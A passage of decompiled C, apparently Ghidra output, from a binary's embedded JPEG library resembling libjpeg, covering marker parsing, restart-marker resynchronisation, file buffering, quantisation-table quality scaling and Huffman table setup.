    if ((byte)(param_2[0xc] | param_2[0xd]) != 0) {
      iVar2 = *param_1;
      *(undefined4 *)(iVar2 + 0x14) = 0x5a;
      *(uint *)(iVar2 + 0x18) = (uint)(byte)param_2[0xc];
      *(uint *)(iVar2 + 0x1c) = (uint)(byte)param_2[0xd];
      (**(code **)(*param_1 + 4))(param_1,1);
    }
    if (iVar3 + -0xe != (uint)(byte)param_2[0xc] * (uint)(byte)param_2[0xd] * 3) {
      iVar2 = *param_1;
      *(undefined4 *)(iVar2 + 0x14) = 0x58;
      *(int *)(iVar2 + 0x18) = iVar3 + -0xe;
      (**(code **)(*param_1 + 4))(param_1,1);
    }
  }
  return;
}



void FUN_0042cde4(int *param_1,char *param_2,uint param_3,int param_4)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  int iVar6;
  
  if ((((param_3 < 0xc) || (*param_2 != 'A')) || (param_2[1] != 'd')) ||
     (((param_2[2] != 'o' || (param_2[3] != 'b')) || (param_2[4] != 'e')))) {
    iVar6 = *param_1;
    *(undefined4 *)(iVar6 + 0x14) = 0x4e;
    *(uint *)(iVar6 + 0x18) = param_3 + param_4;
    (**(code **)(*param_1 + 4))(param_1,1);
  }
  else {
    bVar1 = param_2[7];
    bVar2 = param_2[8];
    bVar3 = param_2[9];
    bVar4 = param_2[10];
    bVar5 = param_2[0xb];
    iVar6 = *param_1;
    *(uint *)(iVar6 + 0x18) = (uint)(byte)param_2[5] * 0x100 + (uint)(byte)param_2[6];
    *(uint *)(iVar6 + 0x1c) = (uint)bVar1 * 0x100 + (uint)bVar2;
    *(uint *)(iVar6 + 0x20) = (uint)bVar3 * 0x100 + (uint)bVar4;
    *(uint *)(iVar6 + 0x24) = (uint)bVar5;
    *(undefined4 *)(*param_1 + 0x14) = 0x4c;
    (**(code **)(*param_1 + 4))(param_1,1);
    param_1[0x49] = 1;
    *(byte *)(param_1 + 0x4a) = bVar5;
  }
  return;
}



undefined4 FUN_0042cec4(int *param_1)

{
  byte bVar1;
  byte **ppbVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  byte *pbVar6;
  byte *pbVar7;
  byte *pbVar8;
  uint uStack40;
  uint uStack36;
  byte abStack32 [16];
  
  ppbVar2 = (byte **)param_1[6];
  pbVar6 = *ppbVar2;
  pbVar8 = ppbVar2[1];
  if (pbVar8 == (byte *)0x0) {
    iVar5 = (*(code *)ppbVar2[3])(param_1);
    if (iVar5 == 0) {
      return 0;
    }
    pbVar6 = *ppbVar2;
    pbVar8 = ppbVar2[1];
  }
  pbVar8 = pbVar8 + -1;
  bVar1 = *pbVar6;
  pbVar6 = pbVar6 + 1;
  if (pbVar8 == (byte *)0x0) {
    iVar5 = (*(code *)ppbVar2[3])(param_1);
    if (iVar5 == 0) {
      return 0;
    }
    pbVar6 = *ppbVar2;
    pbVar8 = ppbVar2[1];
  }
  pbVar8 = pbVar8 + -1;
  pbVar7 = pbVar6 + 1;
  uVar4 = ((uint)bVar1 * 0x100 + (uint)*pbVar6) - 2;
  if ((int)uVar4 < 0xe) {
    uStack36 = uVar4;
    if ((int)uVar4 < 1) {
      uStack36 = 0;
    }
  }
  else {
    uStack36 = 0xe;
  }
  uStack40 = 0;
  pbVar6 = abStack32;
  if (uStack36 != 0) {
    do {
      if (pbVar8 == (byte *)0x0) {
        iVar5 = (*(code *)ppbVar2[3])(param_1);
        if (iVar5 == 0) {
          return 0;
        }
        pbVar7 = *ppbVar2;
        pbVar8 = ppbVar2[1];
      }
      pbVar8 = pbVar8 + -1;
      *pbVar6 = *pbVar7;
      pbVar7 = pbVar7 + 1;
      uStack40 = uStack40 + 1;
      pbVar6 = pbVar6 + 1;
    } while (uStack40 < uStack36);
  }
  iVar5 = uVar4 - uStack36;
  if (param_1[0x68] == 0xe0) {
    FUN_0042cb80(param_1,(char *)abStack32,uStack36,iVar5);
  }
  else if (param_1[0x68] == 0xee) {
    FUN_0042cde4(param_1,(char *)abStack32,uStack36,iVar5);
  }
  else {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x44;
    *(int *)(iVar3 + 0x18) = param_1[0x68];
    (**(code **)*param_1)();
  }
  *ppbVar2 = pbVar7;
  ppbVar2[1] = pbVar8;
  if (0 < iVar5) {
    (**(code **)(param_1[6] + 0x10))(param_1,iVar5);
  }
  return 1;
}



undefined4 FUN_0042d030(int *param_1)

{
  byte bVar1;
  int iVar2;
  byte **ppbVar3;
  int iVar4;
  undefined4 *puVar5;
  byte *pbVar6;
  undefined4 *puVar7;
  byte *pbVar8;
  byte *pbVar9;
  uint uVar10;
  undefined4 *local_24;
  uint local_20;
  uint local_1c;
  uint uStack20;
  
  iVar2 = param_1[0x6e];
  local_24 = *(undefined4 **)(iVar2 + 0xa4);
  local_1c = 0;
  ppbVar3 = (byte **)param_1[6];
  pbVar9 = *ppbVar3;
  pbVar6 = ppbVar3[1];
  if (local_24 == (undefined4 *)0x0) {
    if (pbVar6 == (byte *)0x0) {
      iVar4 = (*(code *)ppbVar3[3])(param_1);
      if (iVar4 == 0) {
        return 0;
      }
      pbVar6 = ppbVar3[1];
      pbVar9 = *ppbVar3;
    }
    pbVar6 = pbVar6 + -1;
    bVar1 = *pbVar9;
    pbVar8 = pbVar9 + 1;
    if (pbVar6 == (byte *)0x0) {
      iVar4 = (*(code *)ppbVar3[3])(param_1);
      if (iVar4 == 0) {
        return 0;
      }
      pbVar6 = ppbVar3[1];
      pbVar8 = *ppbVar3;
    }
    pbVar6 = pbVar6 + -1;
    pbVar9 = pbVar8 + 1;
    local_1c = ((uint)bVar1 * 0x100 + (uint)*pbVar8) - 2;
    if ((int)local_1c < 0) {
      local_20 = 0;
      uVar10 = 0;
      puVar7 = (undefined4 *)0x0;
    }
    else {
      if (param_1[0x68] == 0xfe) {
        uStack20 = *(uint *)(iVar2 + 0x60);
      }
      else {
        uStack20 = *(uint *)(iVar2 + -0x31c + param_1[0x68] * 4);
      }
      if (local_1c < uStack20) {
        uStack20 = local_1c;
      }
      local_24 = (undefined4 *)(**(code **)(param_1[1] + 4))(param_1,1,uStack20 + 0x14);
      *local_24 = 0;
      *(undefined *)(local_24 + 1) = *(undefined *)(param_1 + 0x68);
      local_24[2] = local_1c;
      local_24[3] = uStack20;
      puVar7 = local_24 + 5;
      local_24[4] = puVar7;
      *(undefined4 **)(iVar2 + 0xa4) = local_24;
      uVar10 = 0;
      *(undefined4 *)(iVar2 + 0xa8) = 0;
      local_20 = uStack20;
    }
  }
  else {
    uVar10 = *(uint *)(iVar2 + 0xa8);
    local_20 = local_24[3];
    puVar7 = (undefined4 *)(local_24[4] + uVar10);
  }
  do {
    if (local_20 <= uVar10) {
      if (local_24 != (undefined4 *)0x0) {
        if (param_1[0x4c] == 0) {
          param_1[0x4c] = (int)local_24;
        }
        else {
          puVar7 = (undefined4 *)param_1[0x4c];
          do {
            puVar5 = puVar7;
            puVar7 = (undefined4 *)*puVar5;
          } while (puVar7 != (undefined4 *)0x0);
          *puVar5 = local_24;
        }
        puVar7 = (undefined4 *)local_24[4];
        local_1c = local_24[2] - local_20;
      }
      *(undefined4 *)(iVar2 + 0xa4) = 0;
      if (param_1[0x68] == 0xe0) {
        FUN_0042cb80(param_1,(char *)puVar7,local_20,local_1c);
      }
      else if (param_1[0x68] == 0xee) {
        FUN_0042cde4(param_1,(char *)puVar7,local_20,local_1c);
      }
      else {
        iVar2 = *param_1;
        *(undefined4 *)(iVar2 + 0x14) = 0x5b;
        *(int *)(iVar2 + 0x18) = param_1[0x68];
        *(uint *)(iVar2 + 0x1c) = local_20 + local_1c;
        (**(code **)(*param_1 + 4))(param_1,1);
      }
      *ppbVar3 = pbVar9;
      ppbVar3[1] = pbVar6;
      if (0 < (int)local_1c) {
        (**(code **)(param_1[6] + 0x10))(param_1,local_1c);
      }
      return 1;
    }
    *ppbVar3 = pbVar9;
    ppbVar3[1] = pbVar6;
    *(uint *)(iVar2 + 0xa8) = uVar10;
    if (pbVar6 == (byte *)0x0) {
      iVar4 = (*(code *)ppbVar3[3])(param_1);
      if (iVar4 == 0) {
        return 0;
      }
      pbVar6 = ppbVar3[1];
      pbVar9 = *ppbVar3;
    }
    for (; (uVar10 < local_20 && (pbVar6 != (byte *)0x0)); pbVar6 = pbVar6 + -1) {
      bVar1 = *pbVar9;
      pbVar9 = pbVar9 + 1;
      *(byte *)puVar7 = bVar1;
      puVar7 = (undefined4 *)((int)puVar7 + 1);
      uVar10 = uVar10 + 1;
    }
  } while( true );
}



undefined4 FUN_0042d32c(int *param_1,undefined4 param_2,undefined4 param_3)

{
  byte **ppbVar1;
  int iVar2;
  int iVar3;
  byte *pbVar4;
  byte *pbVar5;
  byte *pbVar6;
  
  ppbVar1 = (byte **)param_1[6];
  pbVar4 = ppbVar1[1];
  pbVar5 = *ppbVar1;
  if (pbVar4 == (byte *)0x0) {
    iVar2 = (*(code *)ppbVar1[3])(param_1,param_2,param_3,param_3);
    if (iVar2 == 0) {
      return 0;
    }
    pbVar5 = *ppbVar1;
    pbVar4 = ppbVar1[1];
  }
  pbVar4 = pbVar4 + -1;
  pbVar6 = pbVar5 + 1;
  iVar2 = (uint)*pbVar5 << 8;
  if (pbVar4 == (byte *)0x0) {
    iVar3 = (*(code *)ppbVar1[3])(param_1);
    if (iVar3 == 0) {
      return 0;
    }
    pbVar6 = *ppbVar1;
    pbVar4 = ppbVar1[1];
  }
  iVar3 = iVar2 + (uint)*pbVar6 + -2;
  iVar2 = *param_1;
  *(undefined4 *)(iVar2 + 0x14) = 0x5b;
  *(int *)(iVar2 + 0x18) = param_1[0x68];
  *(int *)(iVar2 + 0x1c) = iVar3;
  (**(code **)(*param_1 + 4))(param_1,1);
  *ppbVar1 = pbVar6 + 1;
  ppbVar1[1] = pbVar4 + -1;
  if (0 < iVar3) {
    (**(code **)(param_1[6] + 0x10))(param_1,iVar3);
  }
  return 1;
}



undefined4 FUN_0042d3c8(int *param_1)

{
  byte bVar1;
  byte **ppbVar2;
  int iVar3;
  byte *pbVar4;
  uint uVar5;
  byte *pbVar6;
  
  ppbVar2 = (byte **)param_1[6];
  pbVar4 = *ppbVar2;
  pbVar6 = ppbVar2[1];
  while( true ) {
    if (pbVar6 == (byte *)0x0) {
      iVar3 = (*(code *)ppbVar2[3])(param_1);
      if (iVar3 == 0) {
        return 0;
      }
      pbVar4 = *ppbVar2;
      pbVar6 = ppbVar2[1];
    }
    bVar1 = *pbVar4;
    while( true ) {
      pbVar6 = pbVar6 + -1;
      pbVar4 = pbVar4 + 1;
      if (bVar1 == 0xff) break;
      *(int *)(param_1[0x6e] + 0x18) = *(int *)(param_1[0x6e] + 0x18) + 1;
      *ppbVar2 = pbVar4;
      ppbVar2[1] = pbVar6;
      if (pbVar6 == (byte *)0x0) {
        iVar3 = (*(code *)ppbVar2[3])(param_1);
        if (iVar3 == 0) {
          return 0;
        }
        pbVar4 = *ppbVar2;
        pbVar6 = ppbVar2[1];
      }
      bVar1 = *pbVar4;
    }
    do {
      if (pbVar6 == (byte *)0x0) {
        iVar3 = (*(code *)ppbVar2[3])(param_1);
        if (iVar3 == 0) {
          return 0;
        }
        pbVar4 = *ppbVar2;
        pbVar6 = ppbVar2[1];
      }
      uVar5 = (uint)*pbVar4;
      pbVar4 = pbVar4 + 1;
      pbVar6 = pbVar6 + -1;
    } while (uVar5 == 0xff);
    if (uVar5 != 0) break;
    *(int *)(param_1[0x6e] + 0x18) = *(int *)(param_1[0x6e] + 0x18) + 2;
    *ppbVar2 = pbVar4;
    ppbVar2[1] = pbVar6;
  }
  if (*(int *)(param_1[0x6e] + 0x18) != 0) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x74;
    *(undefined4 *)(iVar3 + 0x18) = *(undefined4 *)(param_1[0x6e] + 0x18);
    *(uint *)(iVar3 + 0x1c) = uVar5;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    *(undefined4 *)(param_1[0x6e] + 0x18) = 0;
  }
  param_1[0x68] = uVar5;
  *ppbVar2 = pbVar4;
  ppbVar2[1] = pbVar6;
  return 1;
}



undefined4 FUN_0042d4dc(int *param_1)

{
  byte bVar1;
  byte **ppbVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  byte *pbVar6;
  
  ppbVar2 = (byte **)param_1[6];
  pbVar5 = *ppbVar2;
  pbVar6 = ppbVar2[1];
  if (pbVar6 == (byte *)0x0) {
    iVar3 = (*(code *)ppbVar2[3])(param_1);
    if (iVar3 == 0) {
      return 0;
    }
    pbVar5 = *ppbVar2;
    pbVar6 = ppbVar2[1];
  }
  pbVar6 = pbVar6 + -1;
  bVar1 = *pbVar5;
  pbVar5 = pbVar5 + 1;
  if (pbVar6 == (byte *)0x0) {
    iVar3 = (*(code *)ppbVar2[3])(param_1);
    if (iVar3 == 0) {
      return 0;
    }
    pbVar5 = *ppbVar2;
    pbVar6 = ppbVar2[1];
  }
  uVar4 = (uint)*pbVar5;
  if ((bVar1 != 0xff) || (uVar4 != 0xd8)) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x35;
    *(uint *)(iVar3 + 0x18) = (uint)bVar1;
    *(uint *)(iVar3 + 0x1c) = uVar4;
    (**(code **)*param_1)();
  }
  param_1[0x68] = uVar4;
  *ppbVar2 = pbVar5 + 1;
  ppbVar2[1] = pbVar6 + -1;
  return 1;
}



undefined4 FUN_0042d578(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  
  do {
    if (param_1[0x68] == 0) {
      if (*(int *)(param_1[0x6e] + 0xc) == 0) {
        iVar1 = FUN_0042d4dc(param_1);
        param_3 = extraout_ECX;
        if (iVar1 == 0) {
          return 0;
        }
      }
      else {
        iVar1 = FUN_0042d3c8(param_1);
        param_3 = extraout_ECX_00;
        if (iVar1 == 0) {
          return 0;
        }
      }
    }
    iVar1 = param_1[0x68];
    if (iVar1 < 0xcd) {
      if (iVar1 < 0xc5) {
        if (iVar1 < 0xc3) {
          if (iVar1 == 0xc2) {
            iVar1 = FUN_0042be04(param_1,1,0);
            if (iVar1 == 0) {
              return 0;
            }
          }
          else {
            if (iVar1 == 1) goto switchD_0042d65b_caseD_d0;
            if (1 < iVar1 - 0xc0U) goto switchD_0042d65b_caseD_e;
            iVar1 = FUN_0042be04(param_1,0,0);
            if (iVar1 == 0) {
              return 0;
            }
          }
        }
        else {
          if (iVar1 == 0xc3) goto switchD_0042d65b_caseD_cd;
          if (iVar1 != 0xc4) goto switchD_0042d65b_caseD_e;
          iVar1 = FUN_0042c4c4(param_1);
          if (iVar1 == 0) {
            return 0;
          }
        }
      }
      else {
        switch(iVar1 + -0xc5) {
        case 0:
        case 1:
        case 2:
        case 3:
        case 6:
switchD_0042d65b_caseD_cd:
          iVar1 = *param_1;
          *(undefined4 *)(iVar1 + 0x14) = 0x3c;
          *(int *)(iVar1 + 0x18) = param_1[0x68];
          (**(code **)*param_1)();
          break;
        case 4:
          iVar1 = FUN_0042be04(param_1,0,1);
          if (iVar1 == 0) {
            return 0;
          }
          break;
        case 5:
          iVar1 = FUN_0042be04(param_1,1,1);
          if (iVar1 == 0) {
            return 0;
          }
          break;
        case 7:
          iVar1 = FUN_0042d32c(param_1,iVar1 + -0xc5,param_3);
          if (iVar1 == 0) {
            return 0;
          }
          break;
        default:
switchD_0042d65b_caseD_e:
          iVar1 = *param_1;
          *(undefined4 *)(iVar1 + 0x14) = 0x44;
          *(int *)(iVar1 + 0x18) = param_1[0x68];
          (**(code **)*param_1)();
        }
      }
    }
    else if (iVar1 < 0xdc) {
      if (iVar1 == 0xdb) {
        iVar1 = FUN_0042c7f8(param_1);
        if (iVar1 == 0) {
          return 0;
        }
      }
      else {
        switch(iVar1) {
        case 0xcd:
        case 0xce:
        case 0xcf:
          goto switchD_0042d65b_caseD_cd;
        case 0xd0:
        case 0xd1:
        case 0xd2:
        case 0xd3:
        case 0xd4:
        case 0xd5:
        case 0xd6:
        case 0xd7:
switchD_0042d65b_caseD_d0:
          iVar1 = *param_1;
          *(undefined4 *)(iVar1 + 0x14) = 0x5c;
          *(int *)(iVar1 + 0x18) = param_1[0x68];
          (**(code **)(*param_1 + 4))(param_1,1);
          break;
        case 0xd8:
          iVar1 = FUN_0042bd50(param_1);
          if (iVar1 == 0) {
            return 0;
          }
          break;
        case 0xd9:
          *(undefined4 *)(*param_1 + 0x14) = 0x55;
          (**(code **)(*param_1 + 4))(param_1,1);
          param_1[0x68] = 0;
          return 2;
        case 0xda:
          iVar1 = FUN_0042c184(param_1);
          if (iVar1 == 0) {
            return 0;
          }
          param_1[0x68] = 0;
          return 1;
        default:
          goto switchD_0042d65b_caseD_e;
        }
      }
    }
    else if (iVar1 == 0xdc) {
      iVar1 = FUN_0042d32c(param_1,0,param_3);
      if (iVar1 == 0) {
        return 0;
      }
    }
    else if (iVar1 == 0xdd) {
      iVar1 = FUN_0042ca94(param_1);
      if (iVar1 == 0) {
        return 0;
      }
    }
    else if (iVar1 - 0xe0U < 0x10) {
      iVar1 = (**(code **)(param_1[0x6e] + -0x360 + param_1[0x68] * 4))(param_1);
      if (iVar1 == 0) {
        return 0;
      }
    }
    else {
      if (iVar1 - 0xe0U != 0x1e) goto switchD_0042d65b_caseD_e;
      iVar1 = (**(code **)(param_1[0x6e] + 0x1c))();
      if (iVar1 == 0) {
        return 0;
      }
    }
    param_3 = 0;
    param_1[0x68] = 0;
  } while( true );
}



undefined4 FUN_0042d888(int *param_1)

{
  int iVar1;
  
  if (param_1[0x68] == 0) {
    iVar1 = FUN_0042d3c8(param_1);
    if (iVar1 == 0) {
      return 0;
    }
  }
  if (*(int *)(param_1[0x6e] + 0x14) + 0xd0 == param_1[0x68]) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x62;
    *(undefined4 *)(iVar1 + 0x18) = *(undefined4 *)(param_1[0x6e] + 0x14);
    (**(code **)(*param_1 + 4))(param_1,3);
    param_1[0x68] = 0;
  }
  else {
    iVar1 = (**(code **)(param_1[6] + 0x14))(param_1,*(undefined4 *)(param_1[0x6e] + 0x14));
    if (iVar1 == 0) {
      return 0;
    }
  }
  *(uint *)(param_1[0x6e] + 0x14) = *(int *)(param_1[0x6e] + 0x14) + 1U & 7;
  return 1;
}



undefined4 FUN_0042d918(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = *param_1;
  iVar2 = param_1[0x68];
  *(undefined4 *)(iVar3 + 0x14) = 0x79;
  *(int *)(iVar3 + 0x18) = iVar2;
  *(int *)(iVar3 + 0x1c) = param_2;
  (**(code **)(*param_1 + 4))(param_1,0xffffffff);
  while( true ) {
    if (iVar2 < 0xc0) {
      iVar3 = 2;
    }
    else if ((iVar2 < 0xd0) || (0xd7 < iVar2)) {
      iVar3 = 3;
    }
    else if ((iVar2 == (param_2 + 1U & 7) + 0xd0) || (iVar2 == (param_2 + 2U & 7) + 0xd0)) {
      iVar3 = 3;
    }
    else if ((iVar2 == (param_2 - 1U & 7) + 0xd0) || (iVar2 == (param_2 - 2U & 7) + 0xd0)) {
      iVar3 = 2;
    }
    else {
      iVar3 = 1;
    }
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x61;
    *(int *)(iVar1 + 0x18) = iVar2;
    *(int *)(iVar1 + 0x1c) = iVar3;
    (**(code **)(*param_1 + 4))(param_1,4);
    if (iVar3 == 1) break;
    if (iVar3 == 2) {
      iVar3 = FUN_0042d3c8(param_1);
      if (iVar3 == 0) {
        return 0;
      }
      iVar2 = param_1[0x68];
    }
    else if (iVar3 == 3) {
      return 1;
    }
  }
  param_1[0x68] = 0;
  return 1;
}



void FUN_0042da14(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 0x1b8);
  *(undefined4 *)(param_1 + 0xd8) = 0;
  *(undefined4 *)(param_1 + 0x90) = 0;
  *(undefined4 *)(param_1 + 0x1a0) = 0;
  *(undefined4 *)(iVar1 + 0xc) = 0;
  *(undefined4 *)(iVar1 + 0x10) = 0;
  *(undefined4 *)(iVar1 + 0x18) = 0;
  *(undefined4 *)(iVar1 + 0xa4) = 0;
  return;
}



void FUN_0042da4c(int param_1)

{
  code **ppcVar1;
  code **ppcVar2;
  int iVar3;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,0,0xac);
  *(code ***)(param_1 + 0x1b8) = ppcVar1;
  *ppcVar1 = FUN_0042da14;
  ppcVar2 = ppcVar1 + 8;
  ppcVar1[1] = FUN_0042d578;
  ppcVar1[2] = FUN_0042d888;
  ppcVar1[7] = FUN_0042d32c;
  ppcVar1[0x18] = (code *)0x0;
  iVar3 = 0;
  do {
    *ppcVar2 = FUN_0042d32c;
    ppcVar2[0x11] = (code *)0x0;
    iVar3 = iVar3 + 1;
    ppcVar2 = ppcVar2 + 1;
  } while (iVar3 < 0x10);
  ppcVar1[8] = FUN_0042cec4;
  ppcVar1[0x16] = FUN_0042cec4;
  FUN_0042da14(param_1);
  return;
}



int FUN_0042dba8(int param_1,int param_2)

{
  return (param_2 + -1 + param_1) / param_2;
}



int FUN_0042dbb8(int param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_1 + param_2 + -1;
  return iVar1 - iVar1 % param_2;
}



void FUN_0042dbd0(undefined param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 int param_5,int param_6)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined3 in_register_00000001;
  undefined3 in_register_00000005;
  undefined3 in_register_00000009;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  puVar3 = (undefined4 *)
           (CONCAT31(in_register_00000001,param_1) + CONCAT31(in_register_00000009,param_2) * 4);
  puVar4 = (undefined4 *)(CONCAT31(in_register_00000005,param_3) + param_6 * 4);
  if (0 < param_5) {
    do {
      uVar1 = *puVar3;
      puVar3 = puVar3 + 1;
      uVar2 = *puVar4;
      puVar4 = puVar4 + 1;
      FUN_00420fc8((char)uVar1,(char)uVar2,(char)param_4,uVar2,uVar1,param_4);
      param_5 = param_5 + -1;
    } while (0 < param_5);
  }
  return;
}



void FUN_0042dc1c(void)

{
  undefined4 in_EAX;
  int in_ECX;
  undefined4 in_EDX;
  
  FUN_00420fc8((char)in_EAX,(char)in_EDX,(char)(in_ECX << 7),in_EDX,in_EAX,in_ECX << 7);
  return;
}



void FUN_0042dc2c(void)

{
  undefined4 in_EAX;
  undefined in_CL;
  undefined4 in_EDX;
  
  FUN_00420fb0((char)in_EAX,(char)in_EDX,in_CL,in_EAX,0,in_EDX);
  return;
}



void FUN_0042dc3c(int param_1)

{
  int iVar1;
  
  if (*(int *)(param_1 + 4) != 0) {
    iVar1 = 1;
    do {
      (**(code **)(*(int *)(param_1 + 4) + 0x24))(param_1,iVar1);
      iVar1 = iVar1 + -1;
    } while (0 < iVar1);
    if (*(int *)(param_1 + 0x10) != 0) {
      *(undefined4 *)(param_1 + 0x14) = 200;
      *(undefined4 *)(param_1 + 0x130) = 0;
      return;
    }
    *(undefined4 *)(param_1 + 0x14) = 100;
  }
  return;
}



void FUN_0042dc7c(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (**(code **)(*(int *)(param_1 + 4) + 0x28))();
  }
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  return;
}



void FUN_0042dc9c(int param_1)

{
  int iVar1;
  
  iVar1 = (***(code ***)(param_1 + 4))(param_1,0,0x84);
  *(undefined4 *)(iVar1 + 0x80) = 0;
  return;
}



void FUN_0042dcb4(int param_1)

{
  int iVar1;
  
  iVar1 = (***(code ***)(param_1 + 4))(param_1,0,0x118);
  *(undefined4 *)(iVar1 + 0x114) = 0;
  return;
}



void FUN_0042dccc(int param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  puVar1 = *(undefined4 **)(param_1 + 0x18);
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x1000);
  puVar1[6] = uVar2;
  *puVar1 = uVar2;
  puVar1[1] = 0x1000;
  return;
}



undefined4 FUN_0042dcf8(int *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  undefined in_CL;
  
  puVar1 = (undefined4 *)param_1[6];
  iVar2 = FUN_00420ff8((char)puVar1[5],(char)puVar1[6],in_CL,puVar1[6],1,0x1000,puVar1[5]);
  if (iVar2 != 0x1000) {
    *(undefined4 *)(*param_1 + 0x14) = 0x25;
    (**(code **)*param_1)();
  }
  *puVar1 = puVar1[6];
  puVar1[1] = 0x1000;
  return 1;
}



void FUN_0042dd40(int *param_1)

{
  int iVar1;
  int iVar2;
  undefined in_CL;
  int iVar3;
  undefined4 uVar4;
  
  iVar2 = param_1[6];
  iVar3 = 0x1000 - *(int *)(iVar2 + 4);
  if (iVar3 != 0) {
    iVar1 = FUN_00420ff8((char)*(undefined4 *)(iVar2 + 0x14),(char)*(undefined4 *)(iVar2 + 0x18),
                         in_CL,*(undefined4 *)(iVar2 + 0x18),1,iVar3,*(undefined4 *)(iVar2 + 0x14));
    if (iVar3 != iVar1) {
      *(undefined4 *)(*param_1 + 0x14) = 0x25;
      (**(code **)*param_1)();
    }
  }
  uVar4 = *(undefined4 *)(iVar2 + 0x14);
  iVar2 = FUN_00421014();
  if (iVar2 != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x25;
    (**(code **)*param_1)(param_1,(code **)*param_1,uVar4);
  }
  return;
}



void FUN_0042dd9c(int param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 uVar2;
  
  if (*(int *)(param_1 + 0x18) == 0) {
    uVar2 = (***(code ***)(param_1 + 4))(param_1,0,0x1c);
    *(undefined4 *)(param_1 + 0x18) = uVar2;
  }
  iVar1 = *(int *)(param_1 + 0x18);
  *(code **)(iVar1 + 8) = FUN_0042dccc;
  *(code **)(iVar1 + 0xc) = FUN_0042dcf8;
  *(code **)(iVar1 + 0x10) = FUN_0042dd40;
  *(undefined4 *)(iVar1 + 0x14) = param_2;
  return;
}



void FUN_0042dddc(int *param_1,int param_2,int *param_3,int param_4,int param_5)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  if (param_1[5] != 100) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x14;
    *(int *)(iVar2 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if ((param_2 < 0) || (3 < param_2)) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x1f;
    *(int *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)();
  }
  piVar1 = param_1 + param_2 + 0x11;
  if (*piVar1 == 0) {
    iVar2 = FUN_0042dc9c((int)param_1);
    *piVar1 = iVar2;
  }
  iVar2 = 0;
  do {
    iVar3 = (*param_3 * param_5 + 0x32) / 100;
    if (iVar3 < 1) {
      iVar3 = 1;
    }
    if (0x7fff < iVar3) {
      iVar3 = 0x7fff;
    }
    if ((param_4 != 0) && (0xff < iVar3)) {
      iVar3 = 0xff;
    }
    param_3 = param_3 + 1;
    *(short *)(*piVar1 + iVar2 * 2) = (short)iVar3;
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x40);
  *(undefined4 *)(*piVar1 + 0x80) = 0;
  return;
}



void FUN_0042de94(int *param_1,int param_2,int param_3)

{
  FUN_0042dddc(param_1,0,(int *)&DAT_00440ee8,param_3,param_2);
  FUN_0042dddc(param_1,1,(int *)&DAT_00440fe8,param_3,param_2);
  return;
}



int FUN_0042dec4(int param_1)

{
  int iVar1;
  
  if (param_1 < 1) {
    param_1 = 1;
  }
  if (100 < param_1) {
    param_1 = 100;
  }
  if (param_1 < 0x32) {
    iVar1 = (int)(5000 / (longlong)param_1);
  }
  else {
    iVar1 = param_1 * -2 + 200;
  }
  return iVar1;
}



void FUN_0042def8(int *param_1,int param_2,int param_3)

{
  int iVar1;
  
  iVar1 = FUN_0042dec4(param_2);
  FUN_0042de94(param_1,iVar1,param_3);
  return;
}



void FUN_0042df14(int *param_1,int *param_2,int param_3,undefined4 param_4)

{
  byte bVar1;
  int *piVar2;
  byte *pbVar3;
  int extraout_ECX;
  int iVar4;
  int extraout_EDX;
  int iVar5;
  
  piVar2 = param_1;
  iVar4 = param_3;
  if (*param_2 == 0) {
    piVar2 = (int *)FUN_0042dcb4((int)param_1);
    *param_2 = (int)piVar2;
    iVar4 = extraout_ECX;
  }
  FUN_00420fc8((char)piVar2,(char)*param_2,(char)iVar4,*param_2,param_3,0x11);
  iVar5 = 0;
  iVar4 = 1;
  pbVar3 = (byte *)(param_3 + 1);
  do {
    iVar4 = iVar4 + 1;
    bVar1 = *pbVar3;
    pbVar3 = pbVar3 + 1;
    iVar5 = iVar5 + (uint)bVar1;
  } while (iVar4 < 0x11);
  if ((iVar5 < 1) || (0x100 < iVar5)) {
    *(undefined4 *)(*param_1 + 0x14) = 8;
    (**(code **)*param_1)();
    iVar4 = extraout_EDX;
  }
  FUN_00420fc8((char)(*param_2 + 0x11),(char)iVar4,(char)param_4,*param_2 + 0x11,param_4,iVar5);
  *(undefined4 *)(*param_2 + 0x114) = 0;
  return;
}



void FUN_0042df9c(int *param_1)

{
  FUN_0042df14(param_1,param_1 + 0x15,(int)&DAT_004410e8,&DAT_004410f9);
  FUN_0042df14(param_1,param_1 + 0x19,(int)&DAT_00441122,&DAT_00441133);
  FUN_0042df14(param_1,param_1 + 0x16,(int)&DAT_00441105,&DAT_00441116);
  FUN_0042df14(param_1,param_1 + 0x1a,(int)&DAT_004411d5,&DAT_004411e6);
  return;
}



void FUN_0042dff4(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  if (param_1[5] != 100) {
